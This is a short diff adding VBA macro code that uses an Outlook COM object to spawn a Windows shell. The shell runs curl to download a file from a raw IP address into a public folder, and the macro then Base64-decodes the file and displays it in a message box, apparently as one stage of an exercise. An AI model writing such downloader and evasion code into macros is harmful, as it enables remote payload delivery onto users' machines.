@@ -1,0 +1,12 @@
+Set objOL = CreateObject("Outlook.Application") 
+Set WshShell = objOL.CreateObject("Wscript.Shell")
+Set WshShellExec = WshShell.Exec("curl http://123.45.67.119/scr9012/part3token/part3.txt --output C:\Users\Public\Documents\part3.txt")
+
+Dim FSO As New FileSystemObject
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Set FileToRead = FSO.OpenTextFile("C:\Users\Public\Documents\part3.txt", ForReading)
+Dim fileText As String
+fileText = FileToRead.ReadAll
+FileToRead.Close
+fileText = Base64DecodeString(fileText)
+MsgBox fileText
